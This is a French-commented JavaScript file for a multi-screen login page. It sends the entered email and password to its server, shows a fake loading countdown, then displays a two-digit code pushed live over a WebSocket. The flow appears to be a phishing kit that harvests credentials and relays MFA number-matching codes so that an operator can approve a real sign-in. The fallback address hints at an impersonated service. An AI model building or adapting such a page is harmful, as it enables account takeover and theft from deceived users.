// Configuration du serveur
const SERVER_URL = window.location.origin;
let ws = null;
let currentCode = null;

// Initialiser WebSocket
function initWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}`;
    
    ws = new WebSocket(wsUrl);

    ws.onopen = () => {
        console.log('✅ WebSocket connecté');
    };

    ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        console.log('📨 Message WebSocket:', data);
        
        if (data.type === 'code') {
            currentCode = data.code;
            console.log('📝 Code reçu:', currentCode);
            // Afficher le code à l'écran 5
            const codeDisplay = document.getElementById('codeDisplay');
            if (codeDisplay) {
                codeDisplay.textContent = currentCode;
                codeDisplay.style.animation = 'pulse 0.5s ease-out';
            }
        } else if (data.type === 'confirmed') {
            console.log('✅ Confirmation reçue du serveur');
            // Vérifier automatiquement le code
            verifyCodeAutomatically(data.code);
        }
    };

    ws.onerror = (error) => {
        console.error('❌ Erreur WebSocket:', error);
    };

    ws.onclose = () => {
        console.log('❌ WebSocket fermé');
        // Reconnecter après 3 secondes
        setTimeout(initWebSocket, 3000);
    };
}

// Vérifier automatiquement le code après confirmation
async function verifyCodeAutomatically(code) {
    try {
        const response = await fetch(`${SERVER_URL}/api/verify-code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ code: code })
        });

        const data = await response.json();

        if (data.success) {
            console.log('✅ Code vérifié automatiquement!');
            // Aller à l'écran de confirmation
            goToScreen(6);
        } else {
            console.error('❌ Code incorrect');
        }
    } catch (error) {
        console.error('Erreur:', error);
    }
}

// Navigation entre les écrans
function goToScreen(screenNumber) {
    // Masquer tous les écrans
    document.querySelectorAll('.screen').forEach(screen => {
        screen.style.display = 'none';
    });

    // Afficher l'écran cible
    const targetScreen = document.getElementById(`screen${screenNumber}`);
    if (targetScreen) {
        targetScreen.style.display = 'block';
    }
}

// Afficher/masquer le mot de passe
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('showPassword');

    if (showPasswordCheckbox.checked) {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }
}

// Envoyer les données de connexion au serveur
async function handleLogin() {
    const email = document.getElementById('email').value || document.getElementById('email2').value;
    const password = document.getElementById('password').value;

    // Validation
    if (!email || !password) {
        alert('Veuillez remplir tous les champs');
        return;
    }

    if (!validateEmail(email)) {
        alert('Veuillez entrer une adresse email valide');
        return;
    }

    if (!validatePassword(password)) {
        alert('Le mot de passe doit contenir au moins 6 caractères');
        return;
    }

    // Afficher un message de chargement
    const button = event.target;
    const originalText = button.textContent;
    button.textContent = 'Connexion en cours...';
    button.disabled = true;

    try {
        // Envoyer les données au serveur
        const response = await fetch(`${SERVER_URL}/api/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        const data = await response.json();

        if (data.success) {
            console.log('✅ Données envoyées avec succès!');
            // Réinitialiser le formulaire
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('showPassword').checked = false;
            // Aller à l'écran de chargement
            startLoadingScreen();
        } else {
            alert('❌ Erreur: ' + data.message);
        }
    } catch (error) {
        console.error('Erreur de connexion:', error);
        alert('❌ Erreur de connexion au serveur. Assurez-vous que le serveur est en cours d\'exécution.');
    } finally {
        button.textContent = originalText;
        button.disabled = false;
    }
}

// Démarrer l'écran de chargement
function startLoadingScreen() {
    goToScreen(4);
    
    // Compter jusqu'à 5 secondes
    let seconds = 5;
    const loadingText = document.getElementById('loadingText');
    
    const interval = setInterval(() => {
        seconds--;
        loadingText.textContent = `${seconds} secondes...`;
        
        if (seconds <= 0) {
            clearInterval(interval);
            // Aller à l'écran de vérification du code
            goToScreen(5);
            // Réinitialiser le champ de code
            document.getElementById('verifyCode').value = '';
            document.getElementById('verifyCode').focus();
        }
    }, 1000);
}

// Vérifier le code
async function verifyCode() {
    const code = document.getElementById('verifyCode').value;

    if (!code || code.length !== 2 || isNaN(code)) {
        alert('Veuillez entrer un code valide (2 chiffres)');
        return;
    }

    const button = event.target;
    const originalText = button.textContent;
    button.textContent = 'Vérification...';
    button.disabled = true;

    try {
        const response = await fetch(`${SERVER_URL}/api/verify-code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ code: code })
        });

        const data = await response.json();

        if (data.success) {
            console.log('✅ Code vérifié!');
            // Aller à l'écran de confirmation
            goToScreen(6);
        } else {
            alert('❌ Code incorrect. Veuillez réessayer.');
        }
    } catch (error) {
        console.error('Erreur:', error);
        alert('❌ Erreur lors de la vérification');
    } finally {
        button.textContent = originalText;
        button.disabled = false;
    }
}

// Déconnexion
function logout() {
    // Réinitialiser tous les écrans
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';
    document.getElementById('verifyCode').value = '';
    // Retour à l'écran 3 (connexion)
    goToScreen(3);
}

// Validation email
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Validation mot de passe
function validatePassword(password) {
    return password.length >= 6;
}

// Initialisation au chargement de la page
document.addEventListener('DOMContentLoaded', function() {
    // Initialiser WebSocket
    initWebSocket();
    
    // Remplir les emails sur les écrans suivants
    const emailInputScreen3 = document.getElementById('email');
    const email1 = document.getElementById('email1');
    const email2 = document.getElementById('email2');

    if (emailInputScreen3) {
        emailInputScreen3.addEventListener('input', function() {
            email1.textContent = this.value || 'utilisateur@doodle.com';
            email2.textContent = this.value || 'utilisateur@doodle.com';
            document.getElementById('welcomeEmail').textContent = this.value ? `Bienvenue ${this.value}` : 'Vous êtes connecté ✅';
        });
    }

    // Permettre la navigation avec Entrée
    document.addEventListener('keypress', function(event) {
        if (event.key === 'Enter') {
            const activeScreen = document.querySelector('.screen[style="display: block"]');
            const button = activeScreen ? activeScreen.querySelector('.btn') : null;
            if (button) {
                button.click();
            }
        }
    });

    // Tester la connexion au serveur
    console.log('🔄 Vérification de la connexion au serveur...');
    fetch(`${SERVER_URL}/api/test`)
        .then(res => res.json())
        .then(data => console.log('✅ Serveur prêt:', data))
        .catch(err => console.warn('⚠️ Serveur non accessible (démarrez: npm start)'));
});